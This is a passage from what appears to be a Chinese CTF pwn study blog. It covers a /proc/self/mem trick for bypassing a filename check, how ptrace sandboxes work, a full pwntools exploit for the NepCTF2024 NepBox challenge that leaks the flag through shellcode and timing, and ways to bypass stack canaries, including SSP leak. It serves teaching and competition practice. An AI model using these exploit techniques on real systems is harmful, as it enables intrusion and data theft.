</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s>&#34;flag&#34;</span><span class=p>)</span> <span class=p>){</span> <span class=c1>// filename中查找第一次出现&#34;flag&#34;的位置
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// IDA
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>.</span><span class=nl>rodata</span><span class=p>:</span><span class=mo>000000000000216</span><span class=n>C</span> <span class=n>needle</span>          <span class=n>db</span> <span class=err>&#39;</span><span class=n>flag</span><span class=err>&#39;</span><span class=p>,</span><span class=mi>0</span>             <span class=p>;</span> <span class=n>DATA</span> <span class=nl>XREF</span><span class=p>:</span> <span class=n>Open</span><span class=o>+</span><span class=mi>4</span><span class=n>D</span><span class=err>↑</span><span class=n>o</span></span></span></code></pre></div></div><ul><li><p>通过打开<code>/proc/self/maps</code>文件泄露基址，IDA 中确定字符串偏移</p></li><li><p>用 lseek 修改文件指针进行读取修改，写入<code>/proc/self/mem</code>将&rsquo;flag&rsquo;更改为别的字符串绕过检查</p></li></ul><h3 id=ptrace-进程>Ptrace 进程</h3><p><strong>__WAIT_STATUS</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// 定义了__WAIT_STATUS [union: 共用同一块内存,兼容系统]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>typedef</span> <span class=k>union</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 都用于表示进程状态
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>union</span> <span class=n>wait</span> <span class=o>*</span><span class=n>__uptr</span><span class=p>;</span> <span class=c1>// 早期系统 指向 union wait 类型的指针
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=o>*</span><span class=n>__iptr</span><span class=p>;</span>        <span class=c1>// 现代系统 指向        int 类型的指针
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span> <span class=n>__WAIT_STATUS</span> <span class=nf>__attribute__</span> <span class=p>((</span><span class=n>__transparent_union__</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// IDA
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>__WAIT_STATUS</span> <span class=n>stat_loc</span><span class=p>;</span> <span class=c1>// 存储进程状态的变量 用于判断进程是否在系统调用的标志
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>HIDWORD</span><span class=p>(</span><span class=n>stat_loc</span><span class=p>.</span><span class=n>__iptr</span><span class=p>)</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// iptr指针指向的地址(64位)的高32位置为0 对应源码 int in_syscall = 0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>wait</span><span class=p>((</span><span class=n>__WAIT_STATUS</span><span class=p>)</span><span class=o>&amp;</span><span class=n>stat_loc</span><span class=p>);</span> <span class=c1>// 父进程等待子进程系统调用, 状态存储在stat_loc
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=p>((</span><span class=kr>__int64</span><span class=p>)</span><span class=n>stat_loc</span><span class=p>.</span><span class=n>__uptr</span> <span class=o>&amp;</span> <span class=mh>0xB00</span><span class=p>)</span> <span class=o>==</span> <span class=mh>0xB00</span> <span class=p>)</span> <span class=c1>// __uptr 对应源码的 int status
</span></span></span><span class=line><span class=cl><span class=c1>// Linux 进程状态码 以宏解读: -&gt; 判断是否遇到段错误
</span></span></span><span class=line><span class=cl><span class=c1>// 0x100：子进程被跟踪 (ptraced)
</span></span></span><span class=line><span class=cl><span class=c1>// 0x200：子进程遇到一个致命信号（如段错误）
</span></span></span><span class=line><span class=cl><span class=c1>// 0x800：子进程在执行系统调用时发生错误
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>LOBYTE</span><span class=p>(</span><span class=n>stat_loc</span><span class=p>.</span><span class=n>__uptr</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>127</span> <span class=c1>// LOBYTE获取低8位, 127为 wait(pid) pid标识的命令未知的退出状态值
</span></span></span></code></pre></div></div><p><strong>fork</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>v</span> <span class=o>=</span> <span class=nf>fork</span><span class=p>();</span> <span class=c1>// 子进程中返回0，父进程中返回子进程的PID
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>v</span> <span class=o>&amp;</span> <span class=mh>0x80000000</span> <span class=o>!=</span> <span class=mi>0</span> <span class=c1>// 判断 v 有符号数的最高位是否为1，为1则为负数，为0则为正数，判断v是否为负数
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=n>v</span><span class=p>)</span> <span class=p>{}</span>  <span class=c1>// 进入子进程
</span></span></span></code></pre></div></div><p><strong>ptrace：断点调试和系统调用跟踪</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// 一个进程可观察和控制另一个进程的执行
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>ptrace</span><span class=p>(</span><span class=k>enum</span> <span class=n>__ptrace_request</span> <span class=n>op</span><span class=p>,</span> <span class=kt>pid_t</span> <span class=n>pid</span><span class=p>,</span><span class=kt>void</span> <span class=o>*</span><span class=n>addr</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>v1</span> <span class=o>=</span> <span class=nf>ptrace</span><span class=p>(</span><span class=n>PTRACE_TRACEME</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span> <span class=c1>// 指示该进程由父进程跟踪, 后续参数忽略
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>v1</span> <span class=o>=</span> <span class=nf>ptrace</span><span class=p>(</span><span class=n>PTRACE_ATTACH</span><span class=p>,</span> <span class=n>pid</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span> <span class=c1>// 跟踪调试指定pid进程, 此时子进程等待, 父进程可使用ptrace调试
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>ptrace</span><span class=p>(</span><span class=n>PTRACE_SYSCALL</span><span class=p>,</span> <span class=n>v</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span> <span class=c1>// 重新启动停止的子进程 or 挂起子进程，直到子进程发出系统调用，父进程拦截处理
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>ptrace</span><span class=p>(</span><span class=n>PTRACE_KILL</span><span class=p>,</span> <span class=n>a1</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span> <span class=c1>// 杀掉子进程
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>ptrace</span><span class=p>(</span><span class=n>PTRACE_GETREGS</span><span class=p>,</span> <span class=n>pid</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=n>vg</span><span class=p>);</span> <span class=c1>// 获取子进程寄存器状态, 内容存在vg中
</span></span></span><span class=line><span class=cl><span class=c1>// 源码
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>rax</span> <span class=o>=</span> <span class=n>regs</span><span class=p>.</span><span class=n>orig_rax</span><span class=p>;</span>  <span class=c1>// IDA中源码将显示 v13 = v26等 需要判断
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>rdi</span><span class=o>=</span><span class=n>regs</span><span class=p>.</span><span class=n>rdi</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>rsi</span><span class=o>=</span><span class=n>regs</span><span class=p>.</span><span class=n>rsi</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>rdx</span><span class=o>=</span><span class=n>regs</span><span class=p>.</span><span class=n>rdx</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>rcx</span><span class=o>=</span><span class=n>regs</span><span class=p>.</span><span class=n>rcx</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>rip</span><span class=o>=</span><span class=n>regs</span><span class=p>.</span><span class=n>rip</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>ptrace</span><span class=p>(</span><span class=n>PTRACE_SETREGS</span><span class=p>,</span> <span class=n>pid</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=n>vg</span><span class=p>);</span> <span class=c1>// 设置子进程pid的寄存器值为vg内容
</span></span></span></code></pre></div></div><p><strong>例子：NepCTF2024——NepBox</strong></p><ul><li><strong>子进程</strong>：前提 mmap 了一段地址 0xDEAD000，这段空间不仅可以布置 shellcode，还可以在更高的地方存放泄露的 flag 内容，可以向该地址写入 shellcode，且会由子进程执行</li><li><strong>父进程</strong>：会在子进程调用系统调用前拦截并对系统调用运用<strong>白名单</strong>处理，，采用 open，read，write 到 stdout 获取 flag 值</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>case</span> <span class=nl>__NR_openat</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>permission</span><span class=o>=</span><span class=n>rdx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>OpenFile</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>case</span> <span class=nl>__NR_open</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>permission</span><span class=o>=</span><span class=n>rsi</span><span class=p>;</span> <span class=c1>// rsi != 1
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nl>OpenFile</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>permission</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>ExitAndKillPid</span><span class=p>(</span><span class=n>pid</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>case</span> <span class=nl>__NR_read</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;read(%d,%p,0x%x);</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>rdi</span><span class=p>,</span><span class=n>rsi</span><span class=p>,</span><span class=n>rdx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>case</span> <span class=nl>__NR_write</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=o>=</span><span class=nf>rand</span><span class=p>()</span><span class=o>%</span><span class=n>number</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>regs</span><span class=p>.</span><span class=n>rsi</span><span class=o>=</span><span class=n>say</span><span class=p>[</span><span class=n>choice</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>regs</span><span class=p>.</span><span class=n>rdx</span><span class=o>=</span><span class=nf>strlen</span><span class=p>(</span><span class=n>say</span><span class=p>[</span><span class=n>choice</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>ptrace</span><span class=p>(</span><span class=n>PTRACE_SETREGS</span><span class=p>,</span> <span class=n>pid</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>regs</span><span class=p>);</span> <span class=c1>// 会更改rsi和rdx，flag输出换为其他内容
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>break</span><span class=p>;</span></span></span></code></pre></div></div><p><strong>汇编编写 open, read, write shellcode+基于时间的盲注</strong></p><div class="code-block code-line-numbers" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>time</span> <span class=kn>import</span> <span class=n>time</span> <span class=c1># 用于时间盲注</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;./NepBox&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base</span><span class=o>=</span><span class=mh>0xdead000</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>    /* open(file=&#39;/flag&#39;, oflag=0, mode=0) */
</span></span></span><span class=line><span class=cl><span class=s1>    /* push b&#39;/flag</span><span class=se>\x00</span><span class=s1>&#39; */
</span></span></span><span class=line><span class=cl><span class=s1>    mov rax, 0x101010101010101
</span></span></span><span class=line><span class=cl><span class=s1>    push rax
</span></span></span><span class=line><span class=cl><span class=s1>    mov rax, 0x101010101010101 ^ 0x67616c662f /* &#39;/flag&#39; */
</span></span></span><span class=line><span class=cl><span class=s1>    xor [rsp], rax /* 异或后恢复为/flag */
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    mov rdi, rsp
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    xor edx, edx /* 0 */
</span></span></span><span class=line><span class=cl><span class=s1>    xor esi, esi /* 0 */
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    /* call open() */
</span></span></span><span class=line><span class=cl><span class=s1>    push SYS_open /* 2 */
</span></span></span><span class=line><span class=cl><span class=s1>    pop rax
</span></span></span><span class=line><span class=cl><span class=s1>    syscall
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shellcode</span><span class=o>=</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>    /* call read(3, 0xdead200, 0x30) */
</span></span></span><span class=line><span class=cl><span class=s1>    xor eax, eax /* SYS_read 0 */
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    push 3
</span></span></span><span class=line><span class=cl><span class=s1>    pop rdi
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    push 0x30
</span></span></span><span class=line><span class=cl><span class=s1>    pop rdx
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    mov esi, 0x1010101 /* 0x1010101 ^ 0xcebd301 = 233492992 == 0xdead200 */
</span></span></span><span class=line><span class=cl><span class=s1>    xor esi, 0xcebd301
</span></span></span><span class=line><span class=cl><span class=s1>    syscall
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>/*
</span></span></span><span class=line><span class=cl><span class=s1>   stdout=1
</span></span></span><span class=line><span class=cl><span class=s1>   for(int bytes=0;bytes&lt;=0x30;bytes++){ iLoop
</span></span></span><span class=line><span class=cl><span class=s1>       for(int bits=0;bits&lt;=0x7;bits++){ jLoop
</span></span></span><span class=line><span class=cl><span class=s1>             write(stdout,0xdead200+bits+bytes*8,0x1);
</span></span></span><span class=line><span class=cl><span class=s1>       }
</span></span></span><span class=line><span class=cl><span class=s1>   }
</span></span></span><span class=line><span class=cl><span class=s1>*/
</span></span></span><span class=line><span class=cl><span class=s1>    mov r13,0             /* 偏移量——当前第几个字节:bytes */
</span></span></span><span class=line><span class=cl><span class=s1>    mov r14,0xdead200     /* 基址   */
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>iLoop: /* 外层循环 遍历每个字节 */
</span></span></span><span class=line><span class=cl><span class=s1>    mov r15,0 /* 当前字节第几位: bits */
</span></span></span><span class=line><span class=cl><span class=s1>jLoop: /* 内层循环 遍历每个位 */
</span></span></span><span class=line><span class=cl><span class=s1>    lea rax,[r13+r14] /* rax内容置为r13+r14地址 */
</span></span></span><span class=line><span class=cl><span class=s1>    mov ax,[rax] /* rax中地址指向的内容: 16位 */
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    mov rcx,r15 /* rcx 当前位 */
</span></span></span><span class=line><span class=cl><span class=s1>    shr ax,cl /* 右移将最低位设置为要读取的位 */
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    and ax,1 /* &amp; 0x00000001 取最低位的值 */
</span></span></span><span class=line><span class=cl><span class=s1>    test ax,ax /* 检查当前位是 0 还是 1 */
</span></span></span><span class=line><span class=cl><span class=s1>    jz zero
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>one: /* 进行基于时间的盲注，使得该位为1的时候时间为大于0秒 */
</span></span></span><span class=line><span class=cl><span class=s1>    mov r8,0x200000000 /* 不同机器需要变更该延时时间 */
</span></span></span><span class=line><span class=cl><span class=s1>sleep:
</span></span></span><span class=line><span class=cl><span class=s1>    sub r8,1
</span></span></span><span class=line><span class=cl><span class=s1>    jnz sleep /* 延时操作 */
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>zero:
</span></span></span><span class=line><span class=cl><span class=s1>    /* write(fd=1, buf=0xdead200+[r13], n=0x1) */
</span></span></span><span class=line><span class=cl><span class=s1>    push 1
</span></span></span><span class=line><span class=cl><span class=s1>    pop rdi
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    push 0x1
</span></span></span><span class=line><span class=cl><span class=s1>    pop rdx
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    mov esi, 0x1010101 /* 233492992 == 0xdead200 */
</span></span></span><span class=line><span class=cl><span class=s1>    xor esi, 0xcebd301
</span></span></span><span class=line><span class=cl><span class=s1>    add rsi,r13
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    /* call write() */
</span></span></span><span class=line><span class=cl><span class=s1>    push SYS_write /* 1 */
</span></span></span><span class=line><span class=cl><span class=s1>    pop rax
</span></span></span><span class=line><span class=cl><span class=s1>    syscall
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>jLoopEnd:
</span></span></span><span class=line><span class=cl><span class=s1>    add r15,1 /*
</span></span></span><span class=line><span class=cl><span class=s1>    cmp r15,7
</span></span></span><span class=line><span class=cl><span class=s1>    jbe jLoop
</span></span></span><span class=line><span class=cl><span class=s1>iLoopEnd:
</span></span></span><span class=line><span class=cl><span class=s1>    add r13,1
</span></span></span><span class=line><span class=cl><span class=s1>    cmp r13,0x30
</span></span></span><span class=line><span class=cl><span class=s1>    jbe iLoop
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>,</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcode</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>flag</span><span class=o>=</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=nb>len</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span><span class=o>==</span><span class=mi>0</span> <span class=ow>or</span> <span class=n>flag</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;}&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>now</span><span class=o>=</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>interval</span><span class=o>=</span><span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=p>()</span><span class=o>-</span><span class=n>now</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>interval</span><span class=p>:</span> <span class=c1># 当时间差为 1 时</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=o>|=</span><span class=p>(</span><span class=mi>1</span><span class=o>&lt;&lt;</span><span class=n>i</span><span class=p>)</span> <span class=c1># 在第 i 位上产生一个 1 加入到 s 中, 8 次构成一个字节</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span><span class=o>+=</span><span class=nb>chr</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span></span></span></code></pre></div></div><h2 id=canary-绕过>Canary 绕过</h2><ol><li>格式化字符串读取 canary 的值，canary 最后一个值一定是"\x00"，可以覆盖该值来用<code>%s</code>读取，然后栈溢出再覆盖为 00</li><li>Stack smashing：触发 SSP Leak</li><li>canary 爆破，针对存在 fork 函数，复制出来的程序内存布局都一样，子进程报错退回父进程，canary 不变</li><li>劫持 <code>__stack_chk_fail</code>，修改 got 表中该函数地址</li><li>已知后门函数距起始位置地址 0xabcd，则覆盖返回地址时只覆盖最低<strong>2</strong>字节，有<strong>1/16</strong>概率爆破成功</li></ol><h3 id=ssp-leak>SSP Leak</h3><ul><li><p><strong>(Stack Smashing Protect)</strong>，与 Canary 保护机制有关</p></li><li><p>栈溢出崩溃，在早期 libc 版本（libc-2.23.so 及以前）中会泄露出一个地址，导致结果包含 Canary 值</p></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=c1>#未修复</span>
</span></span><span class=line><span class=cl>*** stack smashing detected ***: ./smashes terminated
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#修复了bug</span>
</span></span><span class=line><span class=cl>*** stack smashing detected ***: terminated
</span></span><span class=line><span class=cl>Aborted <span class=o>(</span>core dumped<span class=o>)</span></span></span></code></pre></div></div><ul><li>低版本 libc 可以通过<code>__stack_chk_fail</code>该泄露出的地址进行操作</li><li>canary 检查不符合的时候引起程序终止时，会打印程序名，而程序名作为<code>arg[0]</code>即<code>__libc_argv[0]</code>，存在于<code>stack</code>上</li><li>故可以考虑覆盖<code>arg[0]</code>，实现泄露任意地址数据</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>//早期函数实现
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=nf>__attribute__</span> <span class=p>((</span><span class=n>noreturn</span><span class=p>))</span> <span class=nf>__stack_chk_fail</span> <span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>__fortify_fail</span> <span class=p>(</span><span class=s>&#34;stack smashing detected&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>__attribute__</span> <span class=p>((</span><span class=n>noreturn</span><span class=p>))</span> <span class=n>internal_function</span> <span class=nf>__fortify_fail</span> <span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* The loop is added only to keep gcc happy.  */</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>__libc_message</span> <span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=s>&#34;*** %s ***: %s terminated</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=n>msg</span><span class=p>,</span> <span class=n>__libc_argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>?:</span> <span class=s>&#34;&lt;unknown&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>gdb 调试，需要覆盖数据为 0x0 的地址处，改为某个地址达成任意地址读，可以通过调试获取，覆盖为<code>elf.sym['flag']</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>pwndbg&gt; print <span class=p>&amp;</span>__libc_argv<span class=o>[</span>0<span class=o>]</span> <span class=c1>#可以在gdb中找到地址</span>
</span></span><span class=line><span class=cl><span class=c1># p __libc_argv获取地址 tele addr查看</span>
</span></span><span class=line><span class=cl>49:0248│         0x7fffffffdf68 —▸ 0x7fffffffe293 ◂— <span class=s1>&#39;/home/xx/pwn&#39;</span>
</span></span><span class=line><span class=cl>4a:0250│         0x7fffffffdf70 ◂— 0x0</span></span></code></pre></div></div><p>通过 cyclic 获取所需值在 cyclic 生成的随机数中的偏移</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>cyclic</span> <span class=mh>0x100</span>
</span></span><span class=line><span class=cl><span class=n>cyclic</span> <span class=o>-</span><span class=n>l</span> <span class=n>abcdef</span>
